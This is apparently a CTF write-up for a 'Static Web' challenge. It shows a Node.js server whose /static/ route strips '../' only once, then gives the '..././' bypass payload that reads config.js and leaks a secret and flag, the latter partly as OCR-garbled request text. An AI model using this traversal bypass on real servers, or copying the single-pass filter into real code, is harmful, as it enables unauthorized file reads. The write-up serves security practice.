# Static Web
> "Static" web for your hacking warmup.

## About the Challenge
We only got 1 file called `index.js` and here is the content of the file

```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const config = require('./config.js')

const server = http.createServer((req, res) => {
    if (req.url.startsWith('/static/')) {
        const urlPath = req.url.replace(/\.\.\//g, '')
        const filePath = path.join(__dirname, urlPath);
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end("Error: File not found");
            } else {
                res.writeHead(200);
                res.end(data);
            }
        });
    } else if (req.url.startsWith('/admin/')) {
        const parsedUrl = url.parse(req.url, true); 
        const queryObject = parsedUrl.query;
        if (queryObject.secret == config.secret) {
            res.writeHead(200);
            res.end(config.flag);
        } else {
            res.writeHead(403);
            res.end('Nope');
        }
    } else if (req.url == '/') {
        fs.readFile('index.html', (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end("Error");
            } else {
                res.writeHead(200);
                res.end(data);
            }
        });
    } else {
        res.writeHead(404);
        res.end("404: Resource not found");
    }
});

server.listen(3000, () => {
    console.log("Server running at http://localhost:3000/");
});
```

The website was vulnerable to path traversal in `/static` endpoint

## How to Solve?
Because there's a filter where we can't input `../`, we need to input `..././` to bypass the filter and then read `config.js` file to obtain the flag


[Image extracted text: Send
Cancel
7
Request
Response
Pretty
Raw
Hex
0 In
=
Pretty
Raw
Hex
Render
GET
Istatich./ /config.js
HTTP/1.1
HTTP/1.1
200
OK
2
Host:
static-web. ctf.cyberjawara. id
2
Server:
nginx/1.24.0
(Ubuntu)
3
3
Date
Sun,
03
Dec
2023
12:25:29
GMT
Connection:
keep-alive
5 Content-Length:
129
6
const
secret
WWijli23ejasdsdjvno2rnj123123 '
8
const
'CJ2023{1st_
wa
rmup_and_mlc_ch3ck}
10
module.exports
{
secret,
flag
flag]


```
CJ2023{1st_warmup_and_m1c_ch3ck}
```